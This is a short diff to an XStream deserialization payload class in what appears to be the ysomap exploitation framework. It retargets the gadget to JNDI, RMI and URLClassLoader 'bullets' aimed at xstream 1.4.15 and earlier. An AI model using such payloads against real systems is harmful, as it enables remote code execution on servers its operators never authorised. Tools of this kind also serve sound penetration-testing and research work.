@@ -3,7 +3,7 @@ package ysomap.payloads.xstream;
 import sun.swing.SwingLazyValue;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
-import ysomap.bullets.jdk.SwingLazyValueBullet;
+import ysomap.bullets.jdk.SwingLazyValueWithJNDIBullet;
 import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 
@@ -30,12 +30,15 @@ import javax.swing.*;
 @Authors({ Authors.WH1T3P1G })
 @Targets({ Targets.XSTREAM })
 @Dependencies({"<=com.thoughtworks.xstream:xstream:1.4.15"})
-@Require(bullets = {"SwingLazyValueBullet"}, param = false)
-public class LazyValue extends XStreamPayload<Object> {
+@Require(bullets = {
+        "SwingLazyValueWithJNDIBullet",
+        "SwingLazyValueWithRMIBullet",
+        "SwingLazyValueWithUrlClassLoaderBullet"}, param = false)
+public class LazyValueForXStream extends XStreamPayload<Object> {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        Bullet bullet =  new SwingLazyValueBullet();
+        Bullet bullet =  new SwingLazyValueWithJNDIBullet();
         bullet.set("jndiURL",args[0]);
         return bullet;
     }
